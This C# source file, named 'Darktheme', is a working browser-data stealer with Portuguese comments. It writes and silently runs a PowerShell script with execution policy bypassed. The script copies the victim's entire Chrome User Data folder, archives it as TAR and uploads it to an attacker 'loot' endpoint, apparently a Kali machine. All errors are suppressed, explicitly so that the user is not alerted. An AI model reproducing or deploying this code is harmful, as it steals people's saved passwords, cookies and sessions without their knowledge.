using System;
using System.IO;
using System.Diagnostics;

namespace Darktheme
{
    internal class Program
    {
        static void Main(string[] args)
        {
            try
            {
                // 1) Script PowerShell que copia User Data, compacta em TAR e envia para o Kali
                string psScript = @"
$log  = '$env:TEMP\debug_ps.txt'
'=== Script iniciado ===' | Out-File $log

$src  = ""$env:LOCALAPPDATA\Google\Chrome\User Data""
$work = ""$env:TEMP\ud_copy""
$dst  = ""$env:TEMP\chrome_userdata.tar""

if (Test-Path $src) {
    'Robocopy...' | Out-File $log -Append
    robocopy $src $work /MIR /R:1 /W:1 /NJH /NJS | Out-Null

    if (Test-Path $dst) { Remove-Item $dst -Force }

    'Compactando...' | Out-File $log -Append
    tar.exe -cf $dst -C $work .            # compacta tudo em TAR

    'Enviando (' + (Get-Item $dst).Length + ' bytes)...' | Out-File $log -Append
    try {
        Invoke-RestMethod -Uri ""IP:Porta/loot"" `
                          -Method Post -InFile $dst `
                          -ContentType ""application/x-tar""
        'Upload OK' | Out-File $log -Append
    } catch {
        'Upload ERRO: ' + $_ | Out-File $log -Append
    }
} else {
    'Pasta Chrome não encontrada.' | Out-File $log -Append
}

'=== Script finalizado ===' | Out-File $log -Append
";

                // 2) Grava o .ps1 no disco
                string psPath = Path.Combine(Path.GetTempPath(), "send_chrome_userdata.ps1");
                File.WriteAllText(psPath, psScript);

                // 3) Executa o PowerShell em modo oculto
                var psProc = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "powershell.exe",
                        Arguments = $"-NoLogo -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"{psPath}\"",
                        UseShellExecute = false,
                        RedirectStandardOutput = false,
                        RedirectStandardError = false,
                        CreateNoWindow = true
                    }
                };

                psProc.Start();
                psProc.WaitForExit();   // aguarda script terminar
            }
            catch
            {
                // Qualquer exceção fica silenciosa para não alertar o usuário
            }
        }
    }
}
